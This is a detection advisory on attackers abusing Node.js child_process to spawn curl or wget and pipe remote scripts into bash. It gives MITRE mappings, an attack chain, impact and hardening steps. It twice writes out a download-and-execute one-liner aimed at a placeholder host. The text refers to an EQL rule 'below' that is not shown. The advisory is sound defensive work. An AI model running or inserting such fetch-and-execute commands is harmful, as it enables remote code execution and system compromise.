---
title: Abuse of Node.js Child Process to Execute External Downloaders
slug: 2026-09-node-downloader-abuse
description: Adversaries leverage Node.js 'child_process' modules to spawn 'curl' or 'wget' for malicious payload delivery, a technique frequently used to facilitate command-and-control by piping remote content directly into local shell interpreters.
date: "2026-09-18T19:04:20Z"
type: advisory
types:
  - advisory
severities:
  - medium
tags:
  - nodejs
  - command-and-control
  - process-spawn
  - download-tool-abuse
mitre_ttps:
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1071
    technique_name: Application Layer Protocol
    evidence: Adversaries may use Node.js to download additional tools or payloads onto the system.
    confidence_band: high
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1105
    technique_name: Ingress Tool Transfer
    evidence: Adversaries often abuse child_process in Node apps to run 'curl -sL http://host/payload.sh | bash,' pulling a second stage from a remote host.
    confidence_band: high
rules:
  - title: Detect Curl or Wget Spawned via Node.js
    description: Detects when Node.js or Bun runtimes spawn curl or wget processes, either directly or through a shell, which is a common pattern for fetching malicious payloads.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
    techniques:
      - T1071.001
      - T1105
    data_sources:
      - process_creation
      - linux
rules_count: 1
action_plan:
  priority: elevated
  owners:
    - Detection Engineering
  immediate_actions:
    - action: Deploy the Curl or Wget Spawned via Node.js Sigma rule to SOC monitoring environment.
      owner: Detection Engineering
      due: 24h
      evidence: Rule d9af2479-ad13-4471-a312-f586517f1243
  mitigation_plan:
    - priority: short_term
      action: Remove unnecessary curl or wget binaries from container runtime images.
      owner: IT Operations
      addresses: T1105
      evidence: Source documentation on hardening.
---

Adversaries frequently abuse the Node.js 'child_process' module to spawn system utilities like 'curl' or 'wget' to download and execute malicious payloads or second-stage scripts. This activity is a common vector for command-and-control (C2) operations, as attackers use it to pull secondary tools directly from remote infrastructure into the memory of a running service. The technique often involves piping the output of these downloaders directly into shell interpreters, such as 'curl -sL http://host/payload.sh | bash', which allows for immediate execution without writing intermediate files to disk.

Monitoring these process relationships is essential for defenders, as Node.js applications are often legitimate but can be compromised or leveraged via insecure 'npm' post-install scripts. Defenders should focus on process lineage, specifically identifying 'node' or 'bun' as the parent process for common downloaders, and validate the legitimacy of any external network connections initiated by these child processes.

## Attack Chain

1. An adversary gains initial access to a system running a Node.js-based application.
2. The attacker modifies application code, injects a malicious 'npm' package, or exploits a vulnerable 'child_process' call.
3. The malicious code invokes 'child_process.exec' or 'child_process.spawn' from the Node.js runtime.
4. The parent process launches a system shell (e.g., '/bin/sh', 'bash') or directly executes a downloader utility ('curl' or 'wget').
5. The downloader initiates an outbound connection to an attacker-controlled remote server.
6. The remote server returns a malicious script or binary payload.
7. The process output is piped directly into an interpreter (e.g., '| bash') for immediate in-memory execution, or the file is saved to a directory like '/tmp' or '/var/tmp'.
8. The final stage executes, establishing a persistent C2 channel or performing lateral movement.

## Impact

Successful exploitation allows attackers to execute arbitrary code with the privileges of the Node.js service account. This can lead to full system compromise, exfiltration of sensitive environment variables (e.g., API keys, service tokens), or the installation of secondary malware. Organizations using Node.js in high-privilege or internet-facing roles are at the highest risk.

## Recommendation

Prioritize detection and hardening to mitigate the abuse of native downloaders within Node.js environments.

- Deploy the EQL detection rule below to monitor for suspicious parent-child process relationships involving 'node' or 'bun'.
- Enforce egress filtering at the network level for production Node.js workloads to restrict connections to known-good update or API endpoints.
- Audit 'package.json' files for suspicious 'postinstall' scripts that may shell out to curl or wget.
- Constrain the runtime environment using AppArmor, SELinux, or seccomp to restrict the ability of Node.js services to spawn shells or access external downloaders.
- Review all child_process invocations in the codebase to ensure command arguments are validated and do not accept user-controlled input.
